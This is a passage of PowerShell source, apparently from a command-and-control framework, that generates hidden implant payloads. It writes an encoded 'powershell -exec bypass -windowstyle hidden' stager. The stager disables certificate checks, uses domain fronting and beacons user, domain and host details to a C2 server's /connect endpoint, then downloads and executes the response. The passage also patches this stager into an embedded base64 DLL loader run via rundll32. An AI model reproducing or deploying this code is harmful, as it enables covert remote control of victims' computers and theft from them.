        $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
        $payload = $payloadraw -replace "`n", ""
        [IO.File]::WriteAllLines("$FolderPath\payloads\payload.bat", $payload)

        Write-Host -Object "Payload written to: $FolderPath\payloads\payload.bat"  -ForegroundColor Green
    }
    
    function PatchDll {
        param($dllBytes, $replaceString, $Arch)

        if ($Arch -eq 'x86') {
            $dllOffset = 0x00003040
            $dllOffset = $dllOffset +8
        }
        if ($Arch -eq 'x64') {
            $dllOffset = 0x00003E70
        }

        # Patch DLL - replace 5000 A's
        $AAAA = "A"*5000
        $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
        $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
    
        # Length of replacement code
        $dllLength = $replaceString.Length
        $patchLength = 5000 -$dllLength
        $nullString = 0x00*$patchLength
        $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
        $nullBytes = $nullBytes[1..$patchLength]
        $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)

        $dllLength = 10000 -3
        $i=0
        # Loop through each byte from start position
        $dllOffset..($dllOffset + $dllLength) | % {
            $dllBytes[$_] = $replaceNewStringBytes[$i]
            $i++
        }
    
        # Return Patched DLL
        return $DllBytes
    }

    # create proxypayloads
    function CreateProxyPayload 
    {
        param
        (
            [Object]
            $username,
            [Object]
            $password,
            [Object]
            $proxyurl
        )
        $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie)
{
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$username = "'+$username+'"
$password = "'+$password+'"
$proxyurl = "'+$proxyurl+'"
$wc = New-Object System.Net.WebClient;  
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($proxyurl) {
$wp = New-Object System.Net.WebProxy($proxyurl,$true); 
if ($username -and $password) {
$PSS = ConvertTo-SecureString $password -AsPlainText -Force; 
$getcreds = new-object system.management.automation.PSCredential $username,$PSS; 
$wp.Credentials = $getcreds;
} else {
$wc.UseDefaultCredentials = $true; 
}
$wc.Proxy = $wp;
}
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
}
$wc
} 
function primer
{
if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
$pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$pretext64 = [Convert]::ToBase64String($pretext)
$primer = (Get-Webclient -Cookie $pretext64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
$primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
$primer
} 
$primer = primer
if ($primer) {$primer| iex} else {
start-sleep 10
primer | iex
}'
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    [IO.File]::WriteAllLines("$FolderPath\payloads\proxypayload.bat", $payload)
    [IO.File]::WriteAllLines("$PoshPath\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
    Write-Host -Object "Payload written to: $FolderPath\payloads\proxypayload.bat"  -ForegroundColor Green
    Write-Host -Object "Payload written to: $PoshPath\Modules\proxypayload.ps1"  -ForegroundColor Green

    $86="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